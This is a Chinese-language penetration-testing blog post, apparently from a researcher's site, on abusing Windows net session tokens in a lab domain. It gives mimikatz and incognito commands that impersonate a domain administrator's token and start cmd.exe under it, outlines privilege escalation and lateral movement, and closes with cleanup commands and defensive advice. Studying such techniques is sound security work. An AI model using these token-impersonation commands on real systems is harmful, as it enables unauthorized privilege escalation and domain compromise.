---
layout: post
title: 渗透技巧——Windows中net session的利用
---


## 0x00 前言
---

在Windows系统中，使用net use命令能够实现远程连接网络中其他计算机的共享资源，连接建立后会创建一个net session。
在渗透测试中，如果我们获得了一台Windows主机的权限，在上面发现了net session，就可以利用这个net session，使用net session的token创建进程。


## 0x01 简介
---

本文将要介绍以下内容：


- 查看net session的方法
- net session的利用
- net session的清除
- 利用思路
- 防御建议


## 0x02 测试环境
---

COMPUTER01：

- Win7 x64
- 域内一台主机
- 192.168.10.2
- 使用帐号test1登录

DC:

- Server2008 R2x64
- 域控服务器
- 192.168.10.1

在DC上使用域管理员帐号Administrator通过net use远程连接COMPUTER01，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/2-1.png)

## 0x03 查看net session的方法
---

### 1、cmd命令

```
net session
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-1.png)

### 2、LogonSessions

下载地址：

https://docs.microsoft.com/en-us/sysinternals/downloads/logonsessions

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-2.png)

可以发现，net session的Logon type为Network

### 3、c++实现

首先通过Windows API LsaEnumerateLogonSessions()枚举当前的Logon Session

接着使用LsaGetLogonSessionData()获得每个Logon Session的具体信息

在程序编写上需要注意无法直接显示sid和时间，需要对格式进行转换

开源代码地址：

https://github.com/3gstudent/Homework-of-C-Language/blob/master/ListLogonSessions.cpp

代码按照LogonSessions的格式输出结果

### 4、mimikatz

```
privilege::debug
token::list
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-3.png)


TEST\Administrator对应的ID为6919466



#### 补充mimikatz的命令

查看当前token：

```
token::whoami
```

恢复进程token：

```
token::revert
```

假冒成system：

```
token::elevate
```

假冒成domain admin：

```
token::elevate /domainadmin
```

假冒成enterprise admin：

```
token::elevate /enterpriseadmin
```

假冒成admin：

```
token::elevate /admin
```

假冒成id为123456的token：

```
token::elevate /id:123456
```


## 0x04 net session的利用
---

net session的token保存在lsass进程中，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-0.png)

在利用上，net session等同于对其token的利用


### 1、mimikatz

假冒成id为6919466的token：

```
token::elevate /id:6919466
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-4.png)

**注：**

上述操作只改变了Thread Token

Windows下有两种token：Primary Token和Impersonation Token

Primary Token对应Process Token，每个进程都有唯一的Primary Token

Impersonation Token对应Thread Token，可以被修改


接下来，使用该token创建进程cmd.exe：

```
process::start cmd.exe
```

但是该命令不会使用新的Thread Token，也就是说进程cmd.exe并没有以TEST\Administrator启动

#### 原因如下：

https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimikatz/modules/kuhl_m_process.c#L38

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-5.png)

https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/modules/kull_m_process.c#L490

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-6.png)

mimikatz在执行`process::start`命令时，使用`CreateProcess`创建进程，并没有传入token


#### 解决方法：

修改mimikatz的源码，使用CreateProcessAsUser()创建进程，能够传入Token

当然，我们还可以使用其他工具来实现这个过程

### 2、使用incognito

源代码开源地址：

https://github.com/fdiskyou/incognito2

**注：**

在之前的文章[《渗透技巧——Token窃取与利用》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/)曾介绍过incognito的用法

列出当前token：

```
incognito.exe list_tokens -u
```

以"TEST\Administrator"启动cmd.exe：

```
incognito.exe execute -c "TEST\Administrator" cmd.exe
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/4-1.png)

net session利用成功，以用户"TEST\Administrator"启动进程cmd.exe，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/4-2.png)

## 0x05 net session的清除
---

### 1、cmd命令

```
net session /delete /y
```

### 2、删除net use连接

net use的发起方删除连接：

```
net use * /del /y
```


## 0x06 利用思路
---

### 1、本地提权

如果尚未获得本地管理员权限，但获得了SeImpersonate或者SeAssignPrimaryToken权限，就能利用net session中的token创建新进程，实现提权

**注：**

之前的文章[《Windows本地提权工具Juicy Potato测试分析》](https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/)和[《渗透技巧——Windows Token九种权限的利用》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-Token%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/)提到过这个方法

### 2、域内渗透

取决于net session的权限，新创建的进程能够继承net session的token


## 0x07 防御建议
---

1、域环境内限制用户权限，尽量避免使用域管理员帐户远程连接
2、使用net use远程连接后记得及时清除

## 0x08 小结
---

本文介绍了利用net session的token创建进程的方法，分析利用思路，给出防御建议。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)




